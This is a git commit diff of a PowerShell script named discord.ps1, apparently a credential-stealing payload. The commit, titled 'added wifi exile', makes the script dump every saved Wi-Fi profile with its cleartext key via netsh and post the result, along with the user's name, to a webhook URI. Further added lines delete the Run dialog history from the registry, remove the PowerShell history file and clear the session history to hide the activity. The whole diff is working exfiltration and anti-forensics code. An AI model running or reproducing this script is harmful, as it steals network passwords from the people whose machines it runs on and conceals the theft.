d06ce806d871e0df894d5a87f6403745daa56ad5
Lucien Berger <73392326+LND2033@users.noreply.github.com>
2025-06-23 17:47:26 +0200

    Update discord.ps1
    added wifi exile

--- discord.ps1
+++ discord.ps1
@@ -1,1 +1,4 @@
-Invoke-RestMethod -Uri $uri -Method Post -ContentType 'Application/Json'-Body (@{'username'=$env:USERNAME;'content'=(ipconfig | Out-String)} | ConvertTo-Json)
+Invoke-RestMethod -Uri $uri -Method Post -ContentType 'Application/Json'-Body (@{'username'=$env:USERNAME;'content'=(((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); ($details=netsh wlan show profile name="$name" key=clear); [PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$details}} | Format-Table -AutoSize) | Out-String)} | ConvertTo-Json)
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+Clear-History
